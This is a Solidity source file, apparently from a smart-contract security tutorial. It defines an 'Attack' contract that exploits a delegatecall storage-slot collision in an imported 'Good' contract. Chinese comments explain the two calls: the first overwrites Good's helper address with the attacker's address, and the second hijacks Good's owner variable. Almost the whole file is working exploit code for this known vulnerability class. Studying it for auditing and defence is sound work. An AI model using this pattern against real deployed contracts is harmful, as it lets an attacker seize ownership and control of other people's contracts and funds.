//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        /*
        第一次攻击，将自己的合约地址传到good中，good此时delegate调用helper，将自己的context传给了helper
        helper将num修改为attack的合约地址
        注意！！！此时helper使用的是good的context，所以此时修改了helper中的num也就是修改了Slot 0的值，
        那么此时good中的Slot 0中的值也就是good中的helper也被修改为了attack的合约地址
        */
        good.setNum(uint(uint160(address(this))));
        /*
        第二次调用，通过第一次攻击，已经将helper的地址修改为了attack合约自己的地址
        此时再次调用。good将会调用到attack中的setNum方法
        同时又因为good是使用delegate调用，所以此时在attack中修改owner就相当于正在修改good中的owner
        那么此时的msg.sender就是good中的msg.sender，good中的msg.sender就是attack合约，因为此时good的调用者就是attack合约
        此时，就成功的将good的owner变量修改为了attack的合约地址
        */
        good.setNum(1);
    }
}